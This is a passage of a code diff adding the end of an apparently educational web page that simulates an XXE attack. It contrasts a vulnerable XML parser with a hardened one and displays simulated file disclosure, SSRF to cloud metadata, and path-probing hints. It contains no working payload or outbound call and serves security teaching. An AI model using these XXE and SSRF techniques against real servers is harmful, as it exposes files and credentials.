+      vOut.innerHTML='<span style="color:#f87171">HTTP 200 OK\n\n'+content+'</span>';
+      verd.className='result-box r-red';
+      if(target.startsWith('http')){
+        verd.innerHTML='<strong>SSRF via XXE!</strong> The vulnerable parser made an outbound HTTP request to <code>'+target+'</code> and returned the response — potentially exposing AWS IAM credentials, instance metadata, or internal services.';
+      } else {
+        verd.innerHTML='<strong>File disclosure confirmed!</strong> The vulnerable parser read <code>'+target+'</code> from the server filesystem and returned its contents in the response. The hardened parser rejected the DOCTYPE before any file access occurred.';
+      }
+    } else {
+      vOut.innerHTML='<span style="color:#f87171">HTTP 200 OK\n\n[File not found or access denied:\n '+target+']\n\n(On a real server, error messages\nmay still reveal path existence)</span>';
+      verd.className='result-box r-amber';
+      verd.innerHTML='<strong>Entity resolved but file not found.</strong> The vulnerable parser attempted to access <code>'+target+'</code>. On a real server, timing differences or error messages can still reveal whether a file exists.';
+    }
+  } else {
+    vOut.innerHTML='<span style="color:#fbbf24">DOCTYPE present but no SYSTEM entity found.\nParser accepted the XML.\n(Internal entities only — lower risk)</span>';
+    verd.className='result-box r-amber';
+    verd.innerHTML='<strong>DOCTYPE detected, no external entity.</strong> The vulnerable parser accepted it. The hardened parser still rejected it — DOCTYPE declarations should be blocked entirely as a precaution.';
+  }
+}
+
+// Run on textarea change
+document.getElementById('xml-input').addEventListener('input', runDemo);
+runDemo();
+</script>
+</body>
+</html>
